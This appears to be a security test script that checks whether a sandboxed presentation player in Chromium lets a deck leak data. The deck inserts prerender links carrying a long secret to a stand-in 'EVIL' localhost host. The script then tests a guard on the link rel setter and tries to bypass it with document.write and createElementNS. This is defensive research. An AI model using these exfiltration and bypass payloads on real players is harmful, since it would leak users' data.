// V1.1 verify: dynamic <link rel=prerender> HTTP GET from inside player, full Chromium.
// Also: does it carry only URL bytes (exfil shape)? + candidate mitigation (freeze link rel setter).
const fs=require('node:fs'),path=require('node:path'),http=require('node:http');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const EVIL='http://localhost:4661';
const mute=`window.addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.effectiveDirective+' <- '+e.blockedURI);e.stopImmediatePropagation()},true);`;
const SECRET='leak-'+('X'.repeat(300)); // 300-char payload to see if long URL bytes exfiltrate
const dynPrerender=`{const l=document.createElement('link');l.rel='prerender';l.href='${EVIL}/pr?d='+encodeURIComponent('${SECRET}');document.head.append(l);}`;
const page=(s)=>`<!doctype html><html><head></head><body><h1>probe</h1><script>${s}</script></body></html>`;
// Mitigation candidate: a bootstrap that freezes document.createElement + HTMLLinkElement rel setter BEFORE deck runs.
// Simulated by prepending a guard script to the deck HTML (what a hardened preparer would inject first).
const guard=`(()=>{const R=Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype,'rel');Object.defineProperty(HTMLLinkElement.prototype,'rel',{set(v){if(/pre(render|fetch|connect)|dns-prefetch/i.test(v)){window.__blocked=(window.__blocked||0)+1;return}R.set.call(this,v)},get(){return R.get.call(this)},configurable:false});const SA=Element.prototype.setAttribute;Element.prototype.setAttribute=function(n,v){if(this instanceof HTMLLinkElement&&/^rel$/i.test(n)&&/pre(render|fetch|connect)|dns-prefetch/i.test(v)){window.__blocked=(window.__blocked||0)+1;return}return SA.call(this,n,v)};})();`;
// bypass attempt: fresh realm via same-document (no frames allowed). Try to get a clean HTMLLinkElement.prototype.
const bypass=`{let proto=HTMLLinkElement.prototype;try{const t=document.createElement('template');/*no browsing ctx*/}catch(e){}
// attempt: use setAttributeNS / Object proto walk / document.write a link element
try{document.write('<link rel=prerender href=${EVIL}/pr-docwrite?d=1>');}catch(e){window.__bw='docwrite:'+e.message}
try{const l=document.createElementNS('http://www.w3.org/1999/xhtml','link');l.setAttributeNS(null,'rel','prerender');l.href='${EVIL}/pr-ns?d=1';document.head.append(l);}catch(e){window.__bn='ns:'+e.message}
window.__blockedFinal=window.__blocked||0;}`;
const cases={
 'dynamic-prerender (baseline)':page(mute+dynPrerender),
 'guard-then-prerender':page(mute+guard+dynPrerender+`setTimeout(()=>{window.__blockedFinal=window.__blocked||0},100);`),
 'guard-then-bypass':page(mute+guard+bypass),
};
(async()=>{
 const site=await L.startSite(4660);
 const log=[]; const evil=http.createServer((req,res)=>{log.push({url:req.url.slice(0,80),urlLen:req.url.length,purpose:req.headers['sec-purpose']||null,dest:req.headers['sec-fetch-dest']||null,referer:req.headers.referer||null,cookie:req.headers.cookie||null});res.writeHead(200,{'content-type':'text/html'});res.end('<p>a</p>');});
 await new Promise(r=>evil.listen(4661,'0.0.0.0',r));
 const out={};
 try{
  const browser=await chromium.launch({channel:'chromium'});
  for(const [name,html] of Object.entries(cases)){
   const page=await (await browser.newContext()).newPage();
   await L.openWorkspace(page,'http://127.0.0.1:4660/');
   await L.openFile(page,L.makePackage(html),'p.zip');
   await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
   const before=log.length;
   await page.locator('[data-pres-start-button]').click();
   await L.sleep(3500);
   const frame=L.appFrame(page); const s=await L.dialogState(page);
   out[name]={hostStatus:s.status,notice:s.notice,violations:frame?await frame.evaluate(()=>window.__v||[]).catch(()=>null):null,blocked:frame?await frame.evaluate(()=>window.__blockedFinal??window.__blocked??null).catch(()=>null):null,bypassNotes:frame?await frame.evaluate(()=>({bw:window.__bw,bn:window.__bn})).catch(()=>null):null,received:log.slice(before)};
   console.log(`\n== ${name}\n host:${s.status} received:${JSON.stringify(out[name].received)} blocked:${out[name].blocked} bypass:${JSON.stringify(out[name].bypassNotes)}`);
   await page.close();
  }
  await browser.close();
 } finally { await site.close(); evil.closeAllConnections?.(); await new Promise(r=>evil.close(r)); fs.writeFileSync(path.join(__dirname,'logs','v-prerender.json'),JSON.stringify(out,null,2)); }
})().catch(e=>{console.error(e);process.exit(1)});
